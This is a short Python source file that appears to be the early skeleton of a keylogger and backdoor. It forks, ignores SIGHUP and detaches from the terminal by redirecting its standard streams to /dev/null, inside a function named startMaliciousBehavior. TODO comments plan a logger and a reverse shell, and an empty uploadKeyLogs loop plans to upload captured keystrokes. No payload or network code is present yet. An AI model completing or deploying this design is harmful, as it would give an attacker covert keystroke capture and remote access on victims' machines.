import time
import os
import paramiko
import sys
import random
import signal
import subprocess
import traceback

MINIMUM_UPLOAD_TIME_IN_SECONDS = 1


def main() -> None:
    processId = os.fork()

    if childProcess(processId):
        startMaliciousBehavior()


def childProcess(processId: int) -> bool:
    """Return True if process is a child and False otherwise."""
    return processId == 0


def startMaliciousBehavior() -> None:
    addSignalHandlers()
    flushInputOutput()
    disconnectFromTerminal()
    # TODO start logger here
    # TODO start reverse shell here


def addSignalHandlers() -> None:
    """Add all the signal handlers for the program.
    
    The following singals are caught:
        * SIGHUP
    """
    signal.signal(signal.SIGHUP, signal.SIG_IGN)


def flushInputOutput() -> None:
    """Flush out (empty) stdout as well as stderr."""
    sys.stdout.flush()
    sys.stderr.flush()


def disconnectFromTerminal():
    """Disconnect from terminal.

    Disconnect from terminal by changing the stdin, stdout and stderr
    to devnull. This ensures that the process is no longer connected to
    the session.
    """
    with open(os.devnull, "rb", 0) as devNull:
        os.dup2(devNull.fileno(), sys.stdin.fileno())
        os.dup2(devNull.fileno(), sys.stdout.fileno())
        os.dup2(devNull.fileno(), sys.stderr.fileno())

def uploadKeyLogs() -> None:
    while True:
        pass